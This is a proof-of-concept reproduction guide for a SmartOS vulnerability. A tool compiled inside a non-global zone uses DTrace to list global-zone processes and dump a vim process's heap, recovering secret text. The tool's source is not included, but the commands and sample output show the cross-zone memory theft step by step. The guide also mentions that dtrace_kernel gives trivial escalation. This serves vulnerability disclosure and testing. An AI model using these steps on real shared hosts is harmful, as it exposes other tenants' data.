Testing the Vulnerability
-------------------------

[Download SmartOS](https://us-east.manta.joyent.com/Joyent_Dev/public/SmartOS/20150917T232817Z/index.html). I used the USB Image
because I'm installing into VirtualBox.


  https://wiki.smartos.org/display/DOC/Download+SmartOS

I then followed the instructions on this page to create the VirtualBox machine.

  https://wiki.smartos.org/display/DOC/SmartOS+as+a+Sandboxed+VirtualBox+Guest

When you boot it steps you through the installation.

Next you have to create a zone:
  imgadm import 0edf00aa-0562-11e5-b92f-879647d45790

Create a file named web.json with the following content. Change the ip to an
address on the same network as your smartos vm (my smartos vm had ip 10.0.2.15)
and change the gateway/netmask to have the same gateway/netmask as your
smartos vm.

  {
   "brand": "joyent",
   "image_uuid": "0edf00aa-0562-11e5-b92f-879647d45790",
   "alias": "web01",
   "hostname": "web01",
   "max_physical_memory": 512,
   "quota": 20,
   "resolvers": ["8.8.8.8"],
   "nics": [
    {
      "nic_tag": "admin",
      "ip": "10.0.2.16",
      "netmask": "255.255.255.0",
      "gateway": "10.0.2.2"
    }
   ]
  }

Run the following command to create the zone:

  vmadm create -f web.json

You will get a message like:

  Successfully created VM 08c4df93-9d10-4aa4-989a-a1b94c2a8eb9

Then you can use the following command to log into the zone:

  zlogin 08c4df93-9d10-4aa4-989a-a1b94c2a8eb9

Then you can run 'ppriv $$' to get a list of your current privileges. It should
not contain the dtrace_kernel privilege which you can use to elevate to global
zone trivially (since it lets you read/write to arbitrary kernel memory).

You need to install gcc via:

  pkgin install gcc47-4.7.4

Copy global_ps2.c into the zone and run:

  /opt/local/gcc47/bin/gcc -o global_ps2 global_ps2.c -ldtrace -lctf --std=gnu99

In the root zone run:

  vim secret.txt

and type in SECRET but don't exit vim

In the child zone run:

  ./global_ps2

You should see 'vim secret.txt' in the output:

  PID COMMAND PSARGS BRKBASE
  8024 global_ps2 ./global_ps2 0x414b90
  8015 vim vim secret.txt 0x81f8be8

Then dump the segments for the vim process by:

  ./global_ps2 segment -p 8015

You should see a segment marked as heap with an address and size:

  ADDRESS SIZE FLAGS
  0xfec2f000 4096
  0x81ef000 188416 [heap]

You can them dump the heap of the vim process by:

  ./global_ps2 dump -p 8015 -a 0x81ef000 -s 188416 > dump

You can check that SECRET was in the heap dump via:

  strings dump |grep SECRET